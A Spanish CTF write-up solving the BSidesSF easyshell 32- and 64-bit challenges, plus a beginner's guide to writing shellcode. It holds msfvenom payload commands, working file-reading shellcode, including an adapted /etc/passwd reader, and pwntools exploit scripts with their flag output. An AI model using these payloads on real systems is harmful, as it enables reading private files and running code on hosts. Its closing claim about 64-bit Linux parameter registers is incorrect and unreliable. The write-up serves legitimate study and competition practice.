#### Enunciado

Te daban el código fuente de dos ELF, uno de 32 bits y otro de 64 bits, y un servicio corriendo en un servidor donde tenías que enviar un 
exploit remoto para leer el archivo /home/ctf/flag.txt. No había ni que controlar el EIP, me imagino que por eso puntuaban tan poco.

#### Solución

Ambos casos se solucionan de la misma manera, creando un shellcode para leer archivos. Sin embargo, para el caso de 32 bits tendremos la inestimable ayuda de metasploit y usaremos el payload de msfvenom de metasploit que te permite leer un archivo. En el caso de 64 bits te puedes programar en ensamblador un shellcode o bien puedes usar uno de los que hay en shell-storm: http://shell-storm.org/shellcode/files/shellcode-878.php


##### easyshell32

Creamos el payload con metasploit:

```
msfvenom -p linux/x86/read_file PATH=/home/ctf/flag.txt -n 16 -b '\x00\x20\x0d\x0a' -f python
```

Si queremos ver todos los payloads disponibles para cada arquitectura:
```
msfvenom -l payload
```
Y así generamos nuestro cutre script que nos da el valor del flag:

```python
#!/usr/bin/env python
import sys
from pwn import *

buf =  ""
buf += "\x2f\x98\x4b\xfc\x41\x9b\x93\x27\x41\xf5\x91\x40\x98"
buf += "\x9b\xd6\x90\xdd\xc2\xb8\xca\x62\x2e\xa4\xd9\x74\x24"
buf += "\xf4\x5b\x33\xc9\xb1\x15\x83\xc3\x04\x31\x43\x13\x03"
buf += "\x89\x71\xcc\x51\xe6\x40\xa8\x9f\xf8\xac\xc8\xc4\xc9"
buf += "\x65\x05\x7a\xa0\xb5\x2e\x78\xb2\x39\x4f\xf6\x55\xb0"
buf += "\xb6\xb2\x99\xd3\x48\xc3\x54\x53\xc1\x01\xde\x50\xd2"
buf += "\x85\x1e\xe2\xd3\x85\x1e\x14\x19\x05\xa6\x15\xa1\x06"
buf += "\xd6\xae\xa1\x06\xd6\xd0\x6c\x86\x3e\x15\x91\x78\x41"
buf += "\xb9\x06\xe8\xd0\xa3\xf9\x95\x5e\x4a\x29\x3c\xf2\xf3"
buf += "\x52\xee\x7e\x8c\xe8\xee"


addr = "easyshell-f7113918.ctf.bsidessf.net"
conn = remote(addr, 5252)

conn.send(buf)
conn.interactive()
conn.close()
```

FLAG:c832b461f8772b49f45e6c3906645adb

##### easyshell64

En este caso echamos mano de shell-storm.org, ya que metasploit no tiene un payload para leer archvios en 64 bits. En concreto cogemos el payload http://shell-storm.org/shellcode/files/shellcode-878.php

```
\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
```

Este payload está diseñado para leer /etc/passwd, lo que tendremos que hacer es quitar los carácteres en hexadecimal que corresponden a esa cadena (situados al final del payload) y sustituirlos por las de nuestro archivo a leer /home/ctf/flag.txt. Por lo tanto el cutre script queda de la siguiente manera:

```python
#!/usr/bin/env python
import sys
from pwn import *

buf = "\xeb\x3f\x5f\x80\x77\x12\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x63\x74\x66\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74\x41"

addr = "easyshell64-efb598a6.ctf.bsidessf.net"
conn = remote(addr, 5253)

conn.send(buf)
conn.interactive()
conn.close()
```

Si lo ejecutamos:

```
python otro.py 
[!] Pwntools does not support 32-bit Python.  Use a 64-bit release.
[+] Opening connection to easyshell64-efb598a6.ctf.bsidessf.net on port 5253: Done
[*] Switching to interactive mode
Send me stuff!! We're 64 bits!
FLAG:e8864c381822ec7cf97f5516745411f5
$  [*] Got EOF while reading in interactive
```

Luego descubrí que hay otra manera más sencilla usando el payload de 64 bits de metasploit que te permite ejecutar un comando:

```
msfvenom -p linux/x64/exec CMD="cat /home/ctf/flag.txt" -n 16 -b '\x00\x20\x0d\x0a' -f python
```

#### Teoría básica de shellcodes

#####¿Qué son estos shellcodes? 

El shellcode no es más que los opcodes de las instrucciones de lenguaje ensamblador. Hagamos un ejemplo con el clásico "Hola mundo" en ensamblador:

```asm
global _start

section .text

_start:
    jmp MESSAGE      ; 1) lets jump to MESSAGE

GOBACK:
    mov eax, 0x4
    mov ebx, 0x1
    pop ecx          ; 3) we are poping into `ecx`, now we have the
                     ; address of "Hello, World!\r\n" 
    mov edx, 0xF
    int 0x80

    mov eax, 0x1
    mov ebx, 0x0
    int 0x80

MESSAGE:
    call GOBACK       ; 2) we are going back, since we used `call`, that means
                      ; the return address, which is in this case the address 
                      ; of "Hello, World!\r\n", is pushed into the stack.
    db "Hello, World!", 0dh, 0ah

```

En este código se utiliza el clásico jmp-call para dejar en la pila la dirección de memoria de la variable a la que queremos acceder. En este caso "Hello, World!". Está explicado este método en los comentarios. 


#####¿Cómo se genera?

Una vez que tenemos el código ensamblador, lo compilamos y creamos el ejecutable:

```
nasm -f elf hello.asm
ld -o hello hello.o

./hello 
Hello, World!
```
Ahora para sacar el conjuto de opcodes de las instrucciones de ensamblador bastaría con ejecutar los siguiente:

```
objdump -M intel -d hello

hello:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 1e                	jmp    8048080 <MESSAGE>    ---> De aquí cogeríamos '\xeb\x1e'

08048062 <GOBACK>:
 8048062:	b8 04 00 00 00      	mov    eax,0x4              ---> De aquí cogeríamos '\xb8\x04\x00\x00\x00'
 8048067:	bb 01 00 00 00       	mov    ebx,0x1              ---> De aquí cogeríamos '\xbb\x01\x00\x00\x00'
 804806c:	59                   	pop    ecx                  ---> De aquí cogeríamos '\x59'
 804806d:	ba 0f 00 00 00       	mov    edx,0xf              ---> Y así sucesivamente...
 8048072:	cd 80                	int    0x80                 
 8048074:	b8 01 00 00 00       	mov    eax,0x1
 8048079:	bb 00 00 00 00       	mov    ebx,0x0
 804807e:	cd 80                	int    0x80

08048080 <MESSAGE>:
 8048080:	e8 dd ff ff ff       	call   8048062 <GOBACK>
 8048085:	48                   	dec    eax                      <--- A partir de aquí hasta el final, estás instrucciones no se ejecutan.
 8048086:	65 6c                	gs ins BYTE PTR es:[edi],dx     <--- En realidad estas instrucciones es como interpreta objdump los caracteres de la variable "Hello, World!"
 8048088:	6c                   	ins    BYTE PTR es:[edi],dx     <--- Son la traducción a ensamblador de las valores ascii de la cadena.
 8048089:	6f                   	outs   dx,DWORD PTR ds:[esi]
 804808a:	2c 20                	sub    al,0x20
 804808c:	57                   	push   edi
 804808d:	6f                   	outs   dx,DWORD PTR ds:[esi]
 804808e:	72 6c                	jb     80480fc <MESSAGE+0x7c>
 8048090:	64                   	fs
 8048091:	21                   	.byte 0x21
 8048092:	0d                   	.byte 0xd
 8048093:	0a                   	.byte 0xa
```

Si quisieramos probarlo a través de un programa de C, sólo tendríamos que ir colocando por orden nuestro shellcode en el array code y probar si funciona. Es importante hacer el array constante para que se guarda en una dirección de memoria que tenga permiso de ejecucción, sino daría un **Segmentaion fault.**

```
const char code[] = 

    "\xe9\x1e\x00\x00\x00"  //          jmp    8048083 <MESSAGE>
    "\xb8\x04\x00\x00\x00"  //          mov    $0x4,%eax
    "\xbb\x01\x00\x00\x00"  //          mov    $0x1,%ebx
    "\x59"                  //          pop    %ecx
    "\xba\x0f\x00\x00\x00"  //          mov    $0xf,%edx
    "\xcd\x80"              //          int    $0x80
    "\xb8\x01\x00\x00\x00"  //          mov    $0x1,%eax
    "\xbb\x00\x00\x00\x00"  //          mov    $0x0,%ebx
    "\xcd\x80"              //          int    $0x80
    "\xe8\xdd\xff\xff\xff"  //          call   8048065 <GOBACK>
    "Hello wolrd!\r\n";     // OR       "\x48\x65\x6c\x6c\x6f\x2c\x20\x57"
                            //          "\x6f\x72\x6c\x64\x21\x0d\x0a"


int main(int argc, char **argv)
{
    (*(void(*)())code)();

    return 0;
}
```
```
gcc test.c -o test
./test
Hello wolrd!
```

#####Ejemplo leer fichero en 64 bits

Veamos como se construye el shellcode para leer el fichero /etc/passwd en un entorno x86_64 linux. Si tenemos este código de ensamblador:

```asm
global _start

section .text

_start:
jmp short _push_filename

_readfile:
; syscall open file (const char *filename, int flags, int mode)
; $rax=2 (sys_open); $rdi= puntero_a_nombre_fichero; $rsi=0 (read_only); $rdx=0644o (flags)
pop rdi ; puntero_a_nombre_fichero
xor rax, rax
add al, 2   ; set sys_open 
xor rsi, rsi ; set O_RDONLY flag
syscall
; en $rax nos devuelve el fd que apunta al fichero abierto

; syscall read file (unsigned int fd, char *buf, size_t count)
; $rax=0(sys_read); $rdi= $rax(fd) ; $rsi= puntero_a_memoria ; $rdx=0xfff(número de bytes a leer)
sub sp, 0xfff
lea rsi, [rsp]  ; $rsi = puntero a memoria donde vamos a guardar lo que leemos
mov rdi, rax    ; $rdi = fd devuelto en la syscall anterior
xor rdx, rdx
mov dx, 0xfff   ; $rdx = cantidad de bytes a leer
xor rax, rax    ; $rax = sys_read (0)
syscall
; $rax = bytes leídos

; syscall write to stdout (sys_write, unsigned int fd, const char *buf, size_t count)
; $rax=1(sys_write); $rdi= 0x1 (pantalla) ; $rsi= puntero_a_memoria ; $rdx= $rax (bytes leídos en el anterior syscall)
xor rdi, rdi
add dil, 1  ; set stdout fd = 1 (screen)
mov rdx, rax    ; bytes leídos en el anterior syscall
xor rax, rax
add al, 1   ; $rax = sys_write (1)
syscall

; syscall exit (int error_code=60) 
xor rax, rax
add al, 60  ; $rax = sys_exit (60)
syscall

_push_filename:
call _readfile
path: db "/etc/passwd"

```

Estoy probando esto mismo con 64 bits para un programa en ensamblador que lea el /etc/passwd, de momento me da "Segmentation fault", cuando consiga resolverlo lo colgaré aquí para ver un ejemplo en 64 bits. Creo que tiene que ver en como se pasan los parámetros en 64 bits, que no utiliza la pila (los primeros 4 parámetros van en los registros RCX, RDX, R8, R9, el resto se pasan por la pila).

*That's all folks!*


